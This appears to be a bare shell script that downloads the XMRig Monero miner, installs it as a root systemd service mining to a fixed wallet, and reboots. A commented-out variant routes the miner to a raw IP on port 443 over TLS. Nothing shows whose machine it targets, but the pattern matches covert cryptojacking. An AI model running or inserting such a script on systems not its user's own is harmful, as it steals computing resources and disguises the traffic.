d /usr/local/bin
sudo wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz
sudo tar xvzf xmrig-6.16.2-linux-static-x64.tar.gz
sudo bash -c 'echo -e "[Unit]\nDescription=XMRig Miner\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/xmrig-6.16.2/xmrig -o xmr-asia1.nanopool.org:14444 -u 86hGqmkgwQUecR9zFY4krRKJfdci8iAk1Gv8dtpNhPbzAzUFmTtbs1JH2cHo7v67QyjfYPNQ8Aj1GVKv3MSk56a64FpJq1f --randomx-no-rdmsr --coin monero --rig-id myworker\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/xmrig.service'
sudo systemctl daemon-reload
sudo systemctl enable xmrig.service
sudo reboot &

#cd /usr/local/bin
#sudo wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz
#sudo tar xvzf xmrig-6.16.2-linux-static-x64.tar.gz
#sudo bash -c 'echo -e "[Unit]\nDescription=XMRig Miner\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/xmrig-6.16.2/xmrig -o 191.235.96.114:443 --randomx-no-rdmsr --tls true\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/xmrig.service'
#sudo systemctl daemon-reload
#sudo systemctl enable xmrig.service
#sudo reboot
